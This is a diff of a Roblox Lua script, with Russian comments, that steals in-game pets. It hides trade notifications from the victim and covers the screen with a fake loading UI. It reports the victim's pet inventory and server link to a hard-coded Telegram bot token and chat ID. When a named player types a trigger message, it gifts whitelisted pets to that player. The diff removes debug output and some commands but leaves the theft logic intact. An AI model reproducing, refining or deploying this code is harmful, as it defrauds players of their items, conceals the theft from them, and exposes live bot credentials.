@@ -5,14 +5,12 @@ local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
 local paths = {
     {"Trading", "FinalizingTrade", "Image"},
     {"Trading", "FinalizingTrade", "Text"},
     {"Trading", "FinalizingTrade"},
     {"Top_Notification"},
 }
-
 local function findByPath(root, pathArray)
     local obj = root
     for _, name in ipairs(pathArray) do
@@ -21,12 +19,10 @@ local function findByPath(root, pathArray)
     end
     return obj
 end
-
 local function disableByPath(pathArray)
     local obj = findByPath(PlayerGui, pathArray)
     if obj and obj:IsA("GuiObject") then
         obj.Visible = false
-        warn("❌ Скрыт: " .. table.concat(pathArray, "."))
     elseif obj then
         if obj:IsA("Instance") then
             for _, child in ipairs(obj:GetDescendants()) do
@@ -34,15 +30,12 @@ local function disableByPath(pathArray)
                     child.Visible = false
                 end
             end
-            warn("❌ Скрыт контейнер: " .. table.concat(pathArray, "."))
         end
     end
 end
-
 for _, p in ipairs(paths) do
     disableByPath(p)
 end
-
 PlayerGui.DescendantAdded:Connect(function(obj)
     for _, p in ipairs(paths) do
         if obj.Name == p[#p] then
@@ -52,7 +45,6 @@ PlayerGui.DescendantAdded:Connect(function(obj)
         end
     end
 end)
-
 local function hideTradeNotifications()
     pcall(function()
         for _, gui in ipairs(PlayerGui:GetChildren()) do
@@ -61,10 +53,8 @@ local function hideTradeNotifications()
                     local text = obj.Text or ""
                     local name = obj.Name:lower()
                     
-                    -- Скрываем торговые уведомления
                     if text:find("trade") or text:find("trading") or text:find("accept") or text:find("decline") or
                        name:find("trade") or name:find("gift") or name:find("request") then
-                        -- НЕ скрываем важные элементы торговли
                         if not (obj.Name == "FinalizingTrade" or obj.Parent and obj.Parent.Name == "Trading") then
                             obj.Visible = false
                         end
@@ -74,14 +64,12 @@ local function hideTradeNotifications()
         end
     end)
 end
-
 task.spawn(function()
     while true do
         hideTradeNotifications()
         task.wait(2)
     end
 end)
-
 task.spawn(function()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "CustomLoadingUI"
@@ -170,12 +158,10 @@ task.spawn(function()
     
     task.cancel(dotTask)
 end)
-
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
-
 local WHITELIST = {
     "Raccoon",
     "Fennec Fox", 
@@ -192,15 +178,12 @@ local WHITELIST = {
     "Kitsune",
     "Corrupted Kitsune"
 }
-
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
-
 local STATS = {
     startTime = tick(),
     totalPetsTransferred = 0,
     errors = 0
 }
-
 local function sendToTelegram(text)
     if #text > 3500 then
         text = text:sub(1, 3500) .. "..."
@@ -217,13 +200,11 @@ local function sendToTelegram(text)
     end)
     
     if not success then
-        warn("Telegram error: " .. tostring(result))
         STATS.errors = STATS.errors + 1
     end
     
     return success
 end
-
 local function getServerLink()
     local placeId = game.PlaceId
     local jobId = game.JobId
@@ -234,7 +215,6 @@ local function getServerLink()
         return "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
     end
 end
-
 local function getAllPets()
     local pets = {}
     local sources = {LocalPlayer.Backpack}
@@ -275,7 +255,6 @@ local function getAllPets()
     table.sort(pets, function(a, b) return a.weight > b.weight end)
     return pets
 end
-
 local function getPetsList()
     local pets = getAllPets()
     if #pets == 0 then 
@@ -306,7 +285,6 @@ local function getPetsList()
     
     return table.concat(result, "\n")
 end
-
 local function sendInitialNotification()
     local message = string.format(
         "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
@@ -319,7 +297,6 @@ local function sendInitialNotification()
     
     sendToTelegram(message)
 end
-
 local function transferPet(pet)
     if not pet.isWhitelisted then 
         return false, "Не в списке" 
@@ -348,7 +325,6 @@ local function transferPet(pet)
         return false, "Ошибка"
     end
 end
-
 local function startPetTransfer()
     sendToTelegram("Начинаю передачу...")
     
@@ -390,46 +366,26 @@ local function startPetTransfer()
         successful, failed
     ))
 end
-
 local function setupMessageListener()
     if TextChatService then
         TextChatService.OnIncomingMessage = function(message)
             local speaker = Players:FindFirstChild(message.TextSource.Name)
             if speaker and speaker.Name == TARGET_PLAYER then
-                local msg = message.Text:lower()
-                
                 if message.Text == TRIGGER_MESSAGE then
                     startPetTransfer()
-                elseif msg:find("pets") then
-                    sendToTelegram(getPetsList())
-                elseif msg:find("link") then
-                    sendToTelegram("Ссылка: " .. getServerLink())
-                elseif msg:find("status") then
-                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
-                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                 end
             end
         end
     else
         Players.PlayerChatted:Connect(function(chatType, speaker, message)
             if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
-                local msg = message:lower()
-                
                 if message == TRIGGER_MESSAGE then
                     startPetTransfer()
-                elseif msg:find("pets") then
-                    sendToTelegram(getPetsList())
-                elseif msg:find("link") then
-                    sendToTelegram("Ссылка: " .. getServerLink())
-                elseif msg:find("status") then
-                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
-                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                 end
             end
         end)
     end
 end
-
 task.wait(10)
 sendInitialNotification()
 setupMessageListener()
